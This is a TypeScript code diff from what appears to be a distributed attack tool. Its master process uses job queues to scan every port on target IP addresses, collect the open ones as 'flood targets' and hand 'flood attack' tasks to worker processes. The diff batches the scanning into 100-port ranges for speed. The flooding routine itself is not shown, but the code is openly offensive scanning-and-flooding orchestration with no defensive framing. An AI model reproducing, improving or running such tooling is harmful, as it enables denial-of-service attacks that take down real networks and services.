@@ -15,12 +15,17 @@ const maxPort = 65535;
 
 export interface IPScanTask {
   ip: string;
-  port: number;
+  portRange: [number, number];
 }
 
 export interface FloodTask {
-  targets: IPScanResult[];
+  targets: FloodTarget[];
   localPorts: [number, number];
+}
+
+export interface FloodTarget {
+  ip: string;
+  port: number;
 }
 
 export async function startMaster () {
@@ -45,11 +50,14 @@ export async function startMaster () {
 
   spawnWorkers();
 
-  const openPorts: IPScanResult[] = [];
+  const floodTargets: FloodTarget[] = [];
   portScanQueue.on('job succeeded', (jobId: string, result: IPScanResult) => {
-    if (result.open) {
-      openPorts.push(result);
-      console.log(`Job ${jobId} succeeded with result: ${result.ip} - ${result.port} - ${result.open}`);
+    if (result.openPorts.length > 0) {
+      for (let i = 0; i < result.openPorts.length; i++) {
+        let openPort = result.openPorts[i];
+        floodTargets.push({ip: result.ip, port: openPort});
+        console.log(`Job ${jobId} found target: ${result.ip}:${result.openPorts[i]}`);
+      }
     }
   });
 
@@ -59,10 +67,10 @@ export async function startMaster () {
 
   await awaitQueueEmpty(portScanQueue);
   console.log('all ports have been scanned');
-  console.log('open ports:', openPorts);
+  console.log('flood targets:', floodTargets);
 
   console.time('attack-task-creation');
-  await createFloodTasks(floodAttackQueue, openPorts);
+  await createFloodTasks(floodAttackQueue, floodTargets);
   console.timeEnd('attack-task-creation');
 }
 
@@ -110,9 +118,14 @@ async function createIpScanTasks (queue: BeeQueue, ipAddresses: string[]) {
     let promises = [];
     let ip = ipAddresses[i];
 
-    for (let x = 1; x <= maxPort; x++) {
+    for (let x = 1; x <= maxPort; x += 100) {
       // considerable performance gain by switching from 1 ip/port combo per task to instead having ip ranges.
-      let task: IPScanTask = { ip: ip, port: x };
+      let task: IPScanTask = { ip: ip, portRange: [x, x + 99] };
+
+      if (task.portRange[1] > maxPort) {
+        task.portRange[1] = maxPort;
+      }
+
       promises.push(queue.createJob(task).save());
     }
 
@@ -121,7 +134,7 @@ async function createIpScanTasks (queue: BeeQueue, ipAddresses: string[]) {
   }
 }
 
-async function createFloodTasks (queue: BeeQueue, openPorts: IPScanResult[]) {
+async function createFloodTasks (queue: BeeQueue, floodTargets: FloodTarget[]) {
   let promises = [];
   // for this part we create a number of tasks equal to the number of worker processes to make sure work is spread evenly.
   for (let i = 0; i < workers.length; i++) {
@@ -135,7 +148,7 @@ async function createFloodTasks (queue: BeeQueue, openPorts: IPScanResult[]) {
 
     let localPorts: [number, number] = [startPort, endPort];
     let task: FloodTask = {
-      targets: openPorts,
+      targets: floodTargets,
       localPorts: localPorts
     };
 
@@ -150,11 +163,11 @@ async function awaitQueueEmpty (queue: BeeQueue) {
     const resolveIfQueueEmpty = async () => {
       let health = await queue.checkHealth();
 
-      if (health.active === 0) {
+      if (health.waiting === 0 && health.active === 0) {
         return resolve();
       }
 
-      console.log(`${health.active} tasks remaining in queue`);
+      console.log(`${health.active} tasks being processes ${health.waiting} tasks waiting`);
       setTimeout(resolveIfQueueEmpty, 100);
     };
 
